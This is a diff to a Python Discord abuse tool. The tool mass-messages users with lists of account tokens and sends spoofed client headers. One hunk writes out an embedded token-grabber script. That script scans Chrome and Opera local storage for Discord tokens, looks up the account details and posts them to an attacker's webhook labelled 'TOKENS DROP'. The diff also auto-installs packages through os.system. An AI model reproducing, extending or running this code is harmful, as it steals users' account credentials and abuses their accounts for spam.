@@ -55,7 +55,7 @@ from discord.ext import commands
 try:
     import pyautogui
 except:
-    os.system("pip install discord")
+    os.system("pip install pyautogui")
     import pyautogui
 
 import time
@@ -127,7 +127,11 @@ except:
     os.system('pip install discum')
     import discum
 
-from selenium import webdriver
+try:
+    from selenium import webdriver
+except:
+    os.system('pip install selenium')
+    from selenium import webdriver
 
 ur = 'https://discord.com/api/v9/channels/messages'
 title = 'PussyKiller'
@@ -185,6 +189,7 @@ def secondHeader(token):
 
 
 def spammer():
+    asc = asyncio.get_event_loop()
     tokens = open('tokens.txt', 'r').read().splitlines()
     clear = lambda: os.system('cls')
     clear()
@@ -503,8 +508,6 @@ def spammer():
 
         tokens = open("tokens.txt", "r").read().splitlines()
 
-        asc = asyncio.new_event_loop()
-        asyncio.set_event_loop(asc)
 
         for token in tokens:
             bottuk = discord.Client(status=discord.Status.offline)
@@ -616,28 +619,29 @@ def spammer():
 
                             header = mainHeader(token)
                             header2 = {
-                                'authority': 'discord.com',
-                                'method': 'POST',
-                                'path': '/api/v9/users/@me/channels',
-                                'scheme': 'https',
-                                "authorization": token,
-                                "accept": "*/*",
-                                "accept-language": "en-GB",
-                                "content-length": "90",
-                                "content-type": "application/json",
-                                "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
-                                "origin": "https://discord.com",
-                                'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
-                                'sec-ch-ua-mobile': '?0',
-                                'sec-ch-ua-platform': "Windows",
-                                "sec-fetch-dest": "empty",
-                                "sec-fetch-mode": "cors",
-                                "sec-fetch-site": "same-origin",
-                                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
-                                'x-context-properties': 'e30=',
-                                "x-debug-options": "bugReporterEnabled",
-                                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
-                            }
+                            'authority': 'discord.com',
+                            'method': 'POST',
+                            'path': '/api/v9/users/@me/channels',
+                            'scheme': 'https',
+                            "authorization": token,
+                            "accept": "*/*",
+                            "accept-language": "en-GB",
+                            "content-length": "90",
+                            "content-type": "application/json",
+                            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
+                            "origin": "https://discord.com",
+                            'referer': 'https://discord.com/channels/@me',
+                            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
+                            'sec-ch-ua-mobile': '?0',
+                            'sec-ch-ua-platform': "Windows",
+                            "sec-fetch-dest": "empty",
+                            "sec-fetch-mode": "cors",
+                            "sec-fetch-site": "same-origin",
+                            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
+                            'x-context-properties': 'e30=',
+                            "x-debug-options": "bugReporterEnabled",
+                            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
+                        }
 
                             payload = {'recipient_id': idd}
                             r1 = requests.post(f'https://discord.com/api/v9/users/@me/channels', headers=header2,
@@ -1803,9 +1807,7 @@ import os
 from re import findall
 from json import loads, dumps
 from urllib.request import Request, urlopen
-
 web1 = "''' + web + '''"
-
 lc = os.getenv("LOCALAPPDATA")
 rm = os.getenv("APPDATA")
 PATHS = {
@@ -1815,8 +1817,6 @@ PATHS = {
     "Google Chrome": lc + "\\\\Google\\\\Chrome\\\\User Data\\\\Default",
     "Opera": rm + "\\\\Opera Software\\\\Opera Stable"
 }
-
-
 def header(token=None):
     headers = {
         "Content-Type": "application/json",
@@ -1825,16 +1825,12 @@ def header(token=None):
     if token:
         headers.update({"Authorization": token})
     return headers
-
-
 def da(token):
     try:
         return loads(
             urlopen(Request("https://discordapp.com/api/v9/users/@me", headers=header(token))).read().decode())
     except:
         pass
-
-
 def tukan(path):
     path += "\\\\Local Storage\\\\leveldb"
     tokens = []
@@ -1846,8 +1842,6 @@ def tukan(path):
                 for token in findall(regex, line):
                     tokens.append(token)
     return tokens
-
-
 def grabber():
     em = []
     checked = []
@@ -1862,7 +1856,6 @@ def grabber():
             if not user_data:
                 continue
             username = user_data["username"] + "#" + str(user_data["discriminator"])
-
             emb = {
                 "fields": [
                         {
@@ -1882,11 +1875,9 @@ def grabber():
         "username": "TOKENS DROP"
     }
     try:
-
         urlopen(Request(web1, data=dumps(webhook).encode(), headers=header()))
     except:
         pass
-
 if __name__ == '__main__':
     grabber()
                 ''')
